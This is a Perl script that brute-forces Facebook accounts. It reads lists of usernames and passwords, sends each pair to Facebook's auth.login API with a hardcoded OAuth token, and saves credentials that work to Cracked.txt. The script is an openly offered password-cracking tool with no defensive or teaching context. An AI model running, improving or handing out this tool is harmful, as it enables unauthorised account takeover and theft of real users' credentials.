#!/usr/bin/perl
#
# Author: 1337r00t
# Improver: Ghostboy-287
# 
#
# Description:
# [Cracker Password] - Brute Force Facebook in messenger ,inc
#
# Usage:
# perl facebook.pl
#
# Tested on: Linux & Pentestbox
#
# Module Requirements: 
#
# cpan Term::Completion::Path
# cpan Term::ANSIColor
# ppm install LWP::UserAgent
#
##########################################
use LWP::UserAgent; #Privacy
use Term::ANSIColor qw(:constants); #Color 
use Term::Completion::Path; #Auto-complete
##########################################
system('cls');
print BOLD GREEN "
   ##########################################################
   #                ",BLUE BOLD,"[Facebook API] BF FB API",BOLD GREEN,"                #
   ##########################################################
   #      ",YELLOW,"Coded By 1337r00t & improved by Ghostboy-287",BOLD GREEN,"      #
   ##########################################################
   #                                                        #
   #     ",RESET BOLD,"Instagram : 1337r00t  -/-  Twitter : _1337r00t",BOLD GREEN,"     #
   #                                                        #
   #     ",RESET BOLD,"Github : Ghostboy-287 -/- Twitter : Ghostboy287",BOLD GREEN,"    #
   #                                                        #
   ##########################################################
                   ",RED,"Enter [CTRL+C] For Exit :0\n\n)",RESET;
my $tc = Term::Completion::Path->new(
prompt  =>BOLD BLUE " Enter Usernames File : ",RESET
);
my $usernames = $tc->complete();
open (USERFILE, '<',$usernames) || die RED,"[-] Can't Found ($usernames) !",RESET;
@USERS = <USERFILE>;
close USERFILE;

my $tc = Term::Completion::Path->new(
prompt  =>BOLD BLUE " Enter Passwords File : ",RESET
);
my $passwords = $tc->complete();
open (PASSFILE, '<',$passwords) || die RED,"[-] Can't Found ($passwords) !",RESET;
@PASSS = <PASSFILE>;
close PASSFILE;
system('cls');
print "\n--------\n",YELLOW," Cracking Now !..\n",RESET;
######################
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		#############################################
		$facebook = LWP::UserAgent->new();
		$facebook->default_header('Authorization' => "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16");
		$response = $facebook->post('https://b-api.facebook.com/method/auth.login',
			{ 
			format => 'json',
			email => $username,
			password => $password,
			credentials_type => 'password'
			}
			);
		if ($response->content=~ /"session_key"/) {
			print BOLD GREEN"\t			----------------------------------
			| Cracked :($username:$password) |\n
			----------------------------------\n
			",RESET;
			open(R0T,">>Cracked.txt");
			print R0T "($username:$password)\n";
			close(R0T);
			sleep(3);
		}
		else {
			#Invalid username or password (401)
			if ($response->content=~ /Invalid username or password/) {
				print ITALIC MAGENTA" Failed :",RESET,"($username:$password)\n";
			}
			else
			{
				#Invalid username or email address (400)
				if ($response->content=~ /Invalid username or email address/) {
					print ITALIC MAGENTA" NotFound :",RESET,"($username)\n";
				}
				else
				{
					print ITALIC RED" Error\n",RESET;
				}
			}
		}
	}
}
